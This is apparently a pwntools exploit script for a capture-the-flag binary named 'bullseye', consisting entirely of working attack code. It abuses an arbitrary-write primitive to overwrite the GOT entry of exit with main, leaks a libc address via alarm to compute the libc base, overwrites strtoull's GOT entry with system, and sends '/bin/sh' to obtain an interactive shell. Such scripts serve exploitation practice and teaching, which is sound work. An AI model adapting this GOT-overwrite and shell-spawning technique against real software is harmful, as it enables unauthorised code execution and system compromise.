from pwn import *

elf = ELF('./bullseye.dms')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    # host = 'jh2i.com'
    # port = 50031
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
c
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil('write to?\n')
io.sendline(hex(elf.got['exit']))
#log.info("GOT_Exit: {}".format(hex(elf.got['exit'])))
#log.info("PLT_Exit: {}".format(hex(elf.sym['exit'])))
io.recvuntil('write?\n')
io.sendline(hex(elf.sym['main']))
alarm_address = int(io.recvn(14), 0)
#log.info("Data: {}".format(hex(data)))
libc_base = alarm_address - libc.sym['alarm']
log.info("Libc_base: {}".format(hex(libc_base)))

io.recvuntil('write to?\n')
io.sendline(hex(elf.got['strtoull']))
io.recvuntil('write?\n')
io.sendline(hex(libc_base + libc.sym['system']))

io.recvuntil('write to?\n')
io.sendline('/bin/sh\x00')
io.interactive()